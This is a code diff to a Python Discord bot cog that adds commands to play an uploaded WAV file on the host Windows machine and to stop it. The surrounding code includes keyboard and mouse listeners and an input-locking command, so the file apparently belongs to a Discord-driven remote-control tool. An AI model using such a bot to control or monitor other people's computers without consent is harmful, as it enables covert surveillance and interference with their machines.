@@ -20,6 +20,7 @@ import time
 import pynput
 import asyncio
 import discord
+import tempfile
 import winsound
 import webbrowser
 
@@ -43,6 +44,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 class Lib(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
+        self.tmp_sound = None
         self.mouse_listener = None
         self.keyboard_listener = None
 
@@ -147,6 +149,37 @@ class Lib(commands.Cog):
     async def beep(self, ctx, time_sec:int=1, freq:int=2500):
         time_sec *= 1000
         winsound.Beep(freq, time_sec)
+
+
+    @commands.command(brief='Only accepts WAV file')
+    async def play_sound(self, ctx, loop:bool=False):
+        flags = winsound.SND_ASYNC | winsound.SND_ALIAS
+        if loop:
+            flags |= winsound.SND_LOOP
+
+
+        # Avoid conflicts: Stop before replacing temporary file
+        if self.tmp_sound:
+            winsound.PlaySound(None, winsound.SND_ASYNC)
+            os.unlink(self.tmp_sound)
+            self.tmp_sound = None
+
+        if ctx.message.attachments[0].filename.lower().endswith('.wav'):
+            # Create temporary WAV file
+            with tempfile.NamedTemporaryFile(delete=False) as tmp:
+                await ctx.message.attachments[0].save(tmp.file)
+                self.tmp_sound = tmp.name
+        
+            winsound.PlaySound(self.tmp_sound, flags)
+
+
+    @commands.command()
+    async def stop_sound(self, ctx, loop:bool=False):
+        if self.tmp_sound:
+            winsound.PlaySound(None, winsound.SND_ASYNC)
+            os.unlink(self.tmp_sound)
+            self.tmp_sound = None
+    
 
     @commands.command()
     async def lock_input(self, ctx):
